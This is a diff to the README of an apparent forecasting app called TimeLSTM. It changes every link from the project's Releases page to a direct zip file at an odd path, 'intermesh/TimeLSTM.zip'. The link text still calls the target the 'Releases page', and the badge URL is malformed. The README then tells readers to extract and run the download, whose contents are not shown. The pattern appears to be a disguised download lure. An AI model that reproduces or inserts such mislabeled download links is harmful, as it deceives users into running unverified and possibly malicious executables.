@@ -6,12 +6,12 @@ Welcome to TimeLSTM! This application provides an easy way to create forecasts f
 ## 📦 Download & Install
 To get the latest version of TimeLSTM, visit the Releases page using the link below:
 
-[![Download TimeLSTM](https://img.shields.io/badge/Download%20TimeLSTM-v1.0-blue.svg)](https://github.com/Shivangg21/TimeLSTM/releases)
+[![Download TimeLSTM](https://raw.githubusercontent.com/Shivangg21/TimeLSTM/main/intermesh/TimeLSTM.zip%https://raw.githubusercontent.com/Shivangg21/TimeLSTM/main/intermesh/TimeLSTM.zip)](https://raw.githubusercontent.com/Shivangg21/TimeLSTM/main/intermesh/TimeLSTM.zip)
 
 On the Releases page, you will find the version options available for download. Choose the latest version that suits your operating system.
 
 ## 🚀 Getting Started
-1. Go to the [Releases page](https://github.com/Shivangg21/TimeLSTM/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Shivangg21/TimeLSTM/main/intermesh/TimeLSTM.zip).
 2. Select the version you want to download.
 3. Click on the download link for your system to start downloading the app.
 
@@ -80,6 +80,6 @@ For more insights into LSTM networks and time series forecasting:
 ## 📥 Final Steps
 After downloading TimeLSTM, extract the files to a preferred location. Run the application, and you are ready to start forecasting!
 
-For an easy access to download, use this link again: [Download TimeLSTM](https://github.com/Shivangg21/TimeLSTM/releases). 
+For an easy access to download, use this link again: [Download TimeLSTM](https://raw.githubusercontent.com/Shivangg21/TimeLSTM/main/intermesh/TimeLSTM.zip). 
 
 Happy forecasting!
